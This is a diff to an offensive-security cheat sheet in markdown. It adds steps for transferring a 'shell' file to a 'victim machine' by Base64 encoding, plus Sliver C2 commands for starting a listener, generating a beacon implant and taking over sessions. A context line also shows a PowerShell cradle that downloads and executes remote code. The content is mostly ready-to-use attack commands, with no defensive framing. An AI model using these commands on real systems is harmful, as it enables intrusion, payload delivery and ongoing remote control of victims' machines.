@@ -2012,8 +2012,23 @@ powershell -exec bypass "iex (New-Object Net.WebClient).DownloadString('http://1
 ```
 
 ### Wget
+
 ```
 wget "http://www.contoso.com" -outfile "file"
+```
+
+### Base64
+
+On attacking machine encode the file and copy the output string
+
+```
+base64 file -w 0
+```
+
+Lastly, on the victim machine decode the string
+
+```
+echo APgABAAAA... <SNIP> ...lIuy9i | base64 -d > shell
 ```
 
 ### Certutil
@@ -2562,4 +2577,42 @@ reg.exe query HKLM\SYSTEM\CurrentControlSet\control\computername\activecomputern
 
 ```
 crackpkcs12 cert.pfx -d /usr/share/wordlists/rockyou.txt
+```
+
+### Using Sliver C2
+
+#### Start Listener
+
+```
+http -l 80
+```
+
+#### Generate Beacon
+
+```
+generate beacon -S 5 -b http://127.0.0.1:80
+```
+
+#### List Beacons
+
+```
+beacons
+```
+
+#### Use Beacon
+
+```
+use BeaconID
+```
+
+#### List Sessions
+
+```
+sessions
+```
+
+#### Use Session
+
+```
+use SessionID
 ```
